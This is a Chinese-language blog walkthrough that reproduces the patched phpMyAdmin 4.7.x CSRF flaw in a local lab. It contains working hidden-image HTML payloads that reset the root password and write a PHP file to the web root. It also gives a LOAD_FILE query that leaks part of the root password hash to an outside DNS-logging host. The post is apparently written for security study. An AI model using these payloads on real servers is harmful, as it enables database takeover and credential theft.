---
title: phpMyAdmin 4.7.x CSRF漏洞复现
date: 2018-06-25 13:43:40
tags: "phpmyadmin"
---
phpMyAdmin是个知名MySQL/MariaDB在线管理工具，phpMyAdmin团队在4.7.7版本中修复了一个危害严重的CSRF漏洞（PMASA-2017-9），攻击者可以通过诱导管理员访问恶意页面，悄无声息地执行任意SQL语句。

## 0x00 环境准备
本地复现使用了phpstudy来搭建环境。PHPstudy版本为：phpStudy 2016.11.02。测试发现，选用低于5.5的php会导致phpmyadmin出现报错，本环境选的是php 5.5.38+Apache。配置好服务，端口后，我们的phpmyadmin就创建完成了。

![image](http://wx4.sinaimg.cn/mw690/a1a4875fgy1fsngyisaogj20os0guq5d.jpg)
## 0x01 漏洞利用
使用默认口令root/root登录phpmyadmin。可以看到，当前的phpmyadmin版本为4.7.6，符合利用条件。
#### 修改当前数据库用户密码
创建含有修改root用户密码语句的html文件。
``` html
<p>Hello World</p>
<img src="http://localhost:8888/phpMyAdmin/sql.php?db=mysql&table=user&sql_query=SET%20password
%20=%20PASSWORD(%27ekko.fun%27)" style="display:none;" />
```
使用浏览器打开html文件。

![image](http://wx3.sinaimg.cn/mw690/a1a4875fgy1fsngyj8r2zj20id06gt9p.jpg)

返回phpmyadmin页面，点击刷新（我本地测试并未自动退出）后发现已经登出系统，需要重新登陆。

![image](http://wx3.sinaimg.cn/mw690/a1a4875fgy1fsngyjo3e7j20n70jfae9.jpg)

使用刚刚修改的密码ekko.fun登陆成功。
#### 写文件
创建包含写文件语句的html文件。
``` html
<p>Hello World</p>
<img src="http://localhost:8888/phpMyAdmin/sql.php?db=mysql&table=user&sql_query=select '<?php phpinfo();?>' into outfile 'D:\\phpStudy\\WWW\\phpMyAdmin\\ekko.php'；" style="display:none;" />
```
第一次执行未成功，查看报错信息为：
``` 
Error Code: 1290. The MySQL server is running with the --secure-file-priv option
```
百度得到解决方案：
```
修改my.ini配置文件，重新指定安全路径。 
该配置文件在windows上的路径为D:\phpStudy\MySQL\my.ini，打开之后找到(添加)secure-file-priv="D:\phpStudy\WWW\phpMyAdmin"
将后面的路径指向上传文件或导出文件的父级路径即可，或者改为空
```
改好配置后，重启下服务，使用sql查询下，发现已经生效。

![image](http://wx3.sinaimg.cn/mw690/a1a4875fgy1fsngyk4obbj20dc074q4i.jpg)

再次访问构造的html文件。稍等片刻访问http://localhost:8888/phpMyAdmin/ekko.php

![image](http://wx3.sinaimg.cn/mw690/a1a4875fgy1fsngykvqo3j20qc0gedoq.jpg)
#### 查询数据
mysql提供了load_file()函数来支持读取文件内容的操作。比如读取文件/etc/passwd内容等，对应得sql语句为：
``` sql
select load_file('/etc/passwd')
```
但是对于CSRF来说，该操作在目标机器上执行，我们无法获取文件读取得结果。而load_file()在Windows下支持从网络共享文件夹中读取文件，如'\\192.168.1.100\share\vulnspy.txt'。网络共享文件的地址处不仅可以填写IP还可以填写域名，我们可以通过DNS解析来获取查询的数据。
此处需要用到 DNSLOG 之类的工具：https://github.com/BugScanTeam/DNSLog， 这类工具可以记录域名的 DNS 解析记录。

比如通过DNS解析来获取当前 MySQL root 用户密码，对应的SQL语句为：
``` sql
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT LEFT(PASSWORD,5) AS password FROM mysql.user WHERE user='root' LIMIT 1),'.0nv2wl.ceye.io\\test'));
```
我本地测试此条未通过，执行```SELECT database()```通过。

![image](http://wx1.sinaimg.cn/mw690/a1a4875fgy1fsngyl91t1j20dk02l0sx.jpg)
## 0x002 总结
这个 phpMyAdmin 的 CSRF 漏洞利用有点类似 SQL 盲注的利用，但是对于漏洞触发的时间不可控（即不知道管理员何时会访问含有恶意代码的页面），因此需要更加通用的利用方式。通过该实验，不仅了解该漏洞的内容，还可以更加熟悉CSRF漏洞的利用。


PS:为什么百度搜到的图片居中方法用不起来啊。。。
